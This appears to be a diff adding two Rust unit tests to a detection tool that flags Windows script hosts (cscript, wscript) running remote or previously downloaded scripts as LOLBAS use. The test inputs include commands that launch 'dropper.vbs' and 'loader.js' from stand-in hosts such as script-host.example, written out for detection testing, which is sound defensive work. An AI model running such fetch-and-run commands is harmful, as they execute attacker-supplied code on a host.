@@ -7875,6 +7875,83 @@ mod cscript_tests {
             "js not extracted"
         );
     }
+
+    #[test]
+    fn script_hosts_emit_url_argument_and_lolbas_for_remote_scripts() {
+        let cscript_raw = r#"cscript //nologo "https://script-host.example/dropper.vbs""#;
+        let wscript_raw = r#"wscript "script-host-schemeless.example/dropper.js""#;
+        let mut env = Environment::new(&Config::default());
+
+        interpret_line(cscript_raw, &mut env);
+        interpret_line(wscript_raw, &mut env);
+
+        for expected in [
+            "https://script-host.example/dropper.vbs",
+            "http://script-host-schemeless.example/dropper.js",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing script-host URL argument for {expected}: {:?}",
+                env.traits
+            );
+        }
+        for (name, cmd) in [("cscript", cscript_raw), ("wscript", wscript_raw)] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing script-host LOLBAS provenance for {name}: {:?}",
+                env.traits
+            );
+        }
+    }
+
+    #[test]
+    fn script_hosts_mark_lolbas_for_previously_downloaded_scripts() {
+        let mut env = Environment::new(&Config::default());
+        env.modified_filesystem.insert(
+            "dropper.vbs".to_string(),
+            FsEntry::Download {
+                src: "https://script-host.example/dropper.vbs".to_string(),
+            },
+        );
+        env.modified_filesystem.insert(
+            "loader.js".to_string(),
+            FsEntry::Download {
+                src: "https://script-host.example/loader.js".to_string(),
+            },
+        );
+
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        interpret_line("wscript loader.js", &mut env);
+
+        for expected in [
+            "https://script-host.example/dropper.vbs",
+            "https://script-host.example/loader.js",
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
+                "missing prior-download script URL argument for {expected}: {:?}",
+                env.traits
+            );
+        }
+        for (name, cmd) in [
+            ("cscript", "cscript //nologo dropper.vbs"),
+            ("wscript", "wscript loader.js"),
+        ] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing prior-download script-host LOLBAS provenance for {name}: {:?}",
+                env.traits
+            );
+        }
+    }
 }
 
 #[cfg(test)]
